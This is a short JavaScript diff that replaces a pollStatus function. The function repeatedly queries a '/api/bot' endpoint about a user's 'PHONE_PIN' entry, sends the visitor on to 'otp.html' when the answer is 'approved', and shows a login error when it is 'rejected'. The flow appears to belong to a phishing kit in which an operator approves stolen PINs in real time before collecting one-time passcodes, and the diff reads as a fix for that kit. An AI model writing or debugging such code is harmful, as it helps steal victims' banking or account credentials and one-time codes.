@@ -1,0 +1,19 @@
+// Replace your existing pollStatus function with this:
+function pollStatus() {
+    var interval = setInterval(function() {
+        // Notice the { cache: 'no-store' } at the end
+        fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN', { cache: 'no-store' })
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+            if (data.status === 'approved') {
+                clearInterval(interval);
+                window.location.href = 'otp.html';
+            } 
+            else if (data.status === 'rejected') {
+                clearInterval(interval);
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('loginError').style.display = 'block';
+            }
+        });
+    }, 2000);
+}
